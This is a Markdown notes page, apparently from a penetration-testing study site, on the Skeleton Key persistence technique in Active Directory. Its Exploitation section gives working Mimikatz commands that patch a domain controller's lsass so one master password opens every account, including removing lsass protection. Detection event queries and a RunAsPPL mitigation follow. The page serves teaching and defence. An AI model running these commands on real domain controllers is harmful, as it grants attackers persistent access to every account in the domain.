---
title: "Skeleton Key"
description: "Persistence using Skeleton Key."
lead: "Using Skeleton Key for persistence in Active Directory with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 70
toc: true
---

## General

- Patch a Domain Controller (lsass process) so that it allows access as any user with a single password
- Discovered in malware named Skeleton Key malware
- All publicly known methods are NOT persistent accross reboots
- Mimikatz to the rescue

## Exploitation

```powershell
# Inject skeleton key on DC of choice with default password of 'mimikatz'. DA privs required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# If lsass is running as procted process we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of target DC. Very noisy!
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-

# Access machine with valid username
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\administrator
```

## Detection

- Events:
  - 7045: A service was installed in the system (Type: Kernel Mode Driver)
  - 4624: Account Logon
  - 4634: Account Logoff
  - 4672: Admin Logon
- Events("Audit Privilege Use" must be enabled)
  - 4673: Sensitive Privilege Use
  - 4611: A trusted logon process has been registered with the Local Security Authority

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}

# Not recommended (detects only stock mimidriv)
Get-WinEvent -FilterHashtable @{Logname='Security';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}
```

## Mitigation

- Run lsass.exe as a protected process, as it forces an attacker to load a kernel mode driver -> log detection
- Test before implementing, as many drivers and plguins may not load with the protection

```powershell
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose

# Verify after reboot
Get-WinEvent -FilterHashtable @{Logname='Security';ID=12} | ?{$_.message -like "*protected process*"}
```
